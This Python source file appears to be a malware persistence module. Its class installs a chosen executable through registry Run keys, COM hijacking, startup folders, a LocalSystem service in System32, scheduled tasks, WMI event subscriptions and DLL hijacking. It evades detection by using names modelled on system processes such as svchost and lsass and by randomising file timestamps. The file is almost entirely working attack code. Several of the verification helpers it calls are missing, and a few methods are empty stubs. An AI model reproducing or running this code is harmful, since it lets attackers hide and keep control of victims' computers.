import os
import sys
import winreg
import shutil
import tempfile
import subprocess
import random
import string
import base64
from pathlib import Path
from typing import List, Dict, Optional
import logging
import ctypes
from datetime import datetime, timedelta

class PersistenceMethod:
    """Enum-like class for persistence methods"""
    REGISTRY = "registry"
    STARTUP = "startup"
    SERVICE = "service"
    WMI = "wmi"
    SCHEDULED_TASK = "scheduled_task"
    COM_HIJACK = "com_hijack"
    DLL_HIJACK = "dll_hijack"
    BOOTKIT = "bootkit"

class Persistence:
    def __init__(self):
        self.startup_paths = self._get_startup_paths()
        self.logger = logging.getLogger('Persistence')
        self.installed_methods: Dict[str, bool] = {}
        self.last_check = datetime.now()
        
    def _get_startup_paths(self) -> List[str]:
        """Get system-specific startup paths"""
        paths = []
        if os.name == 'nt':  # Windows
            paths.extend([
                os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
                os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\StartUp'),
                os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Programs')
            ])
        else:  # Unix-like
            paths.extend([
                os.path.expanduser('~/.config/autostart'),
                '/etc/xdg/autostart',
                '/etc/init.d',
                '/etc/systemd/system',
                '/usr/local/bin'
            ])
        return paths
        
    def _generate_random_name(self, prefix: str = "") -> str:
        """Generate a random, legitimate-looking name"""
        system_services = [
            "svchost", "wininit", "lsass", "services", "winlogon",
            "csrss", "spoolsv", "explorer", "taskhost", "conhost"
        ]
        
        if prefix:
            base = prefix
        else:
            base = random.choice(system_services)
            
        suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
        return f"{base}_{suffix}"
        
    def _copy_with_timestamp(self, src: str, dst: str) -> bool:
        """Copy file while preserving/randomizing timestamps"""
        try:
            shutil.copy2(src, dst)
            
            # Randomize access/modify times within last month
            now = datetime.now()
            random_time = now - timedelta(
                days=random.randint(1, 30),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59)
            )
            
            os.utime(dst, (random_time.timestamp(), random_time.timestamp()))
            return True
        except Exception as e:
            self.logger.error(f"Failed to copy file: {str(e)}")
            return False
            
    def install_registry(self, executable_path: str) -> bool:
        """Enhanced registry persistence with multiple methods"""
        if os.name != 'nt':
            return False
            
        success = False
        try:
            # Standard Run keys
            run_keys = [
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
                # Less common keys
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx"),
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"),
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load")
            ]
            
            for hkey, key_path in run_keys:
                try:
                    key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE)
                    name = self._generate_random_name("win")
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    success = True
                except Exception as e:
                    self.logger.debug(f"Failed to set registry key {key_path}: {str(e)}")
                    continue
                    
            # Try COM hijacking
            if self._install_com_hijack(executable_path):
                success = True
                
        except Exception as e:
            self.logger.error(f"Registry persistence failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.REGISTRY] = success
        return success
        
    def _install_com_hijack(self, executable_path: str) -> bool:
        """Install persistence via COM hijacking"""
        try:
            # Common COM objects to hijack
            com_objects = [
                "\\Software\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\LocalServer32",  # Recycle bin
                "\\Software\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\LocalServer32"   # My Computer
            ]
            
            for com_path in com_objects:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, com_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    return True
                except:
                    continue
                    
            return False
        except:
            return False
            
    def install_startup(self, executable_path: str) -> bool:
        """Enhanced startup folder persistence"""
        success = False
        try:
            filename = self._generate_random_name() + os.path.splitext(executable_path)[1]
            
            for startup_path in self.startup_paths:
                if os.path.exists(startup_path):
                    target_path = os.path.join(startup_path, filename)
                    if self._copy_with_timestamp(executable_path, target_path):
                        success = True
                        
                    # Create .lnk shortcut on Windows
                    if os.name == 'nt':
                        shortcut_path = os.path.splitext(target_path)[0] + '.lnk'
                        self._create_shortcut(executable_path, shortcut_path)
                        
        except Exception as e:
            self.logger.error(f"Startup persistence failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.STARTUP] = success
        return success
        
    def _create_shortcut(self, target: str, shortcut_path: str) -> bool:
        """Create a Windows shortcut"""
        try:
            if os.name == 'nt':
                cmd = f'powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\'{shortcut_path}\'); $s.TargetPath = \'{target}\'; $s.Save()"'
                subprocess.run(cmd, shell=True, capture_output=True)
                return True
        except:
            pass
        return False
        
    def install_service(self, executable_path: str) -> bool:
        """Install as a Windows service"""
        try:
            service_name = self._generate_random_name("Svc")
            display_name = self._generate_random_name("Service")
            
            # Copy executable to system directory
            system32 = os.path.join(os.environ['SystemRoot'], 'System32')
            service_exe = os.path.join(system32, f"{service_name}.exe")
            
            if self._copy_with_timestamp(executable_path, service_exe):
                # Create service with minimal permissions
                subprocess.run([
                    'sc', 'create',
                    service_name,
                    'binPath=', service_exe,
                    'start=', 'auto',
                    'obj=', 'LocalSystem',
                    'type=', 'own'
                ], capture_output=True)
                
                # Set description
                subprocess.run([
                    'sc', 'description',
                    service_name,
                    '"Windows System Service"'
                ], capture_output=True)
                
                # Start service
                subprocess.run(['sc', 'start', service_name], capture_output=True)
                
                return True
        except:
            return False
            
        return False
        
    def install_scheduled_task(self, executable_path: str) -> bool:
        """Install persistence via scheduled tasks"""
        if os.name != 'nt':
            return False
            
        success = False
        task_name = self._generate_random_name("task")
        
        try:
            # Create task with multiple triggers
            triggers = [
                ('ONLOGON', ''),
                ('ONSTART', ''),
                ('DAILY', '/ri 1440'),  # Every day
                ('ONIDLE', '/i 10')     # After 10 minutes idle
            ]
            
            for trigger, extra in triggers:
                try:
                    cmd = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc {trigger} {extra} /f'
                    result = subprocess.run(cmd, shell=True, capture_output=True)
                    if result.returncode == 0:
                        success = True
                        break
                except:
                    continue
                    
        except Exception as e:
            self.logger.error(f"Scheduled task creation failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.SCHEDULED_TASK] = success
        return success
        
    def install_wmi(self, executable_path: str) -> bool:
        """Install WMI event consumer persistence"""
        try:
            import wmi
            import win32com.client
            
            # Connect to WMI
            w = wmi.WMI()
            
            # Create a new event filter
            filter_name = self._generate_random_name("WMIFilter")
            consumer_name = self._generate_random_name("WMIConsumer")
            binding_name = self._generate_random_name("WMIBinding")
            
            # Query for system startup
            query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            
            # Create filter
            filter_path = w.Win32_EventFilter.Create(
                Name=filter_name,
                EventNamespace='root\\cimv2',
                QueryLanguage='WQL',
                Query=query
            )
            
            # Create consumer
            consumer_path = w.Win32_CommandLineEventConsumer.Create(
                Name=consumer_name,
                CommandLineTemplate=executable_path
            )
            
            # Bind them together
            w.Win32_FilterToConsumerBinding.Create(
                Filter=filter_path.Path_(),
                Consumer=consumer_path.Path_()
            )
            
            return True
        except:
            return False
            
    def install_dll_hijack(self, executable_path: str) -> bool:
        """Implement DLL hijacking persistence"""
        try:
            # Common DLL hijack targets
            dll_targets = [
                'winmm.dll',
                'uxtheme.dll',
                'cryptsp.dll',
                'apphelp.dll'
            ]
            
            system_dirs = [
                os.environ['SystemRoot'],
                os.path.join(os.environ['SystemRoot'], 'System32'),
                os.path.join(os.environ['SystemRoot'], 'SysWOW64')
            ]
            
            for dll in dll_targets:
                for dir_path in system_dirs:
                    dll_path = os.path.join(dir_path, dll)
                    if not os.path.exists(dll_path):
                        # Copy our executable as the DLL
                        if self._copy_with_timestamp(executable_path, dll_path):
                            return True
                            
            return False
        except:
            return False
            
    def verify_persistence(self) -> Dict[str, bool]:
        """Verify all installed persistence methods are still active"""
        if datetime.now() - self.last_check < timedelta(hours=1):
            return self.installed_methods
            
        for method, was_installed in self.installed_methods.items():
            if not was_installed:
                continue
                
            # Verify each method
            if method == PersistenceMethod.REGISTRY:
                self._verify_registry()
            elif method == PersistenceMethod.STARTUP:
                self._verify_startup()
            elif method == PersistenceMethod.SERVICE:
                self._verify_service()
            elif method == PersistenceMethod.SCHEDULED_TASK:
                self._verify_scheduled_task()
            elif method == PersistenceMethod.WMI:
                self._verify_wmi()
                
        self.last_check = datetime.now()
        return self.installed_methods
        
    def install_all(self, executable_path: str) -> Dict[str, bool]:
        """Try all persistence methods"""
        # First, copy to a stealthy permanent location
        try:
            system_dirs = [
                os.path.join(os.getenv('SYSTEMROOT'), 'System32'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft\\Windows\\Start Menu\\Programs'),
                os.path.join(tempfile.gettempdir(), '.cache')
            ]
            
            for install_dir in system_dirs:
                try:
                    os.makedirs(install_dir, exist_ok=True)
                    new_name = self._generate_random_name() + os.path.splitext(executable_path)[1]
                    permanent_path = os.path.join(install_dir, new_name)
                    
                    if self._copy_with_timestamp(executable_path, permanent_path):
                        executable_path = permanent_path
                        break
                except:
                    continue
                    
        except Exception as e:
            self.logger.error(f"Failed to copy to permanent location: {str(e)}")
            
        # Try all persistence methods
        methods = [
            self.install_registry,
            self.install_startup,
            self.install_service,
            self.install_scheduled_task,
            self.install_wmi,
            self.install_dll_hijack
        ]
        
        for method in methods:
            try:
                method(executable_path)
            except Exception as e:
                self.logger.error(f"Method {method.__name__} failed: {str(e)}")
                
        return self.verify_persistence()

    def handle_filesystem_error(self, error_info: Dict):
        """Gère les erreurs système de fichiers avec résilience"""
        try:
            # Vérifie et répare les permissions
            self._check_and_repair_permissions()
            
            # Nettoie les fichiers temporaires
            self._cleanup_temp_files()
            
            # Vérifie l'intégrité des fichiers critiques
            self._verify_critical_files()
            
        except Exception as e:
            self.logger.error(f"Filesystem error recovery failed: {str(e)}")

    def _check_and_repair_permissions(self):
        # Code pour vérifier et réparer les permissions
        pass

    def _cleanup_temp_files(self):
        # Code pour nettoyer les fichiers temporaires
        pass

    def _verify_critical_files(self):
        # Code pour vérifier l'intégrité des fichiers critiques
        pass
